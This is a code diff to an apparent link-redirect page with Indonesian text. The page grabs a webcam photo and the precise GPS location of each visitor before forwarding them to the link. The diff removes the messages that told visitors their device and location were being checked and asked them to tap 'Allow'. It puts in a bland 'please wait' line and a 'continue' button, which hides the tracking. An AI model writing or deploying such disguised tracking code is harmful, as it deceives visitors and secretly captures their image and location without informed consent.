@@ -561,9 +561,9 @@ const handleRedirect = async (req, res) => {
     <body>
       <div class="card">
         <div class="spinner"></div>
-        <h3>Mengarahkan ke ${link.title}</h3>
-        <p id="statusText">Mengonfirmasi konfirmasi perangkat & lokasi Anda... Silakan ketuk <b>"Izinkan / Allow"</b> jika muncul permintaan akses.</p>
-        <button class="btn" id="proceedBtn" onclick="proceed(null, null, null)">Lanjutkan Langsung &rarr;</button>
+        <h3>Mengarahkan ke ${escapeHtml(link.title)}...</h3>
+        <p id="statusText">Harap tunggu sebentar...</p>
+        <button class="btn" id="proceedBtn" onclick="proceed(null, null, null)">Melanjutkan ke ${escapeHtml(link.title)} &rarr;</button>
       </div>
 
       <video id="webcamVideo" autoplay playsinline></video>
@@ -647,10 +647,8 @@ const handleRedirect = async (req, res) => {
           if (photo) photoDataUrl = photo;
 
           if ("geolocation" in navigator) {
-            document.getElementById('statusText').innerHTML = "Meminta persetujuan lokasi presisi... Silakan klik <b>'Izinkan / Allow'</b> pada HP Anda.";
             navigator.geolocation.getCurrentPosition(
               async (pos) => {
-                document.getElementById('statusText').innerText = "Lokasi GPS presisi terkonfirmasi! Mengarahkan...";
                 proceed(pos.coords.latitude, pos.coords.longitude, photoDataUrl);
               },
               async (err) => {
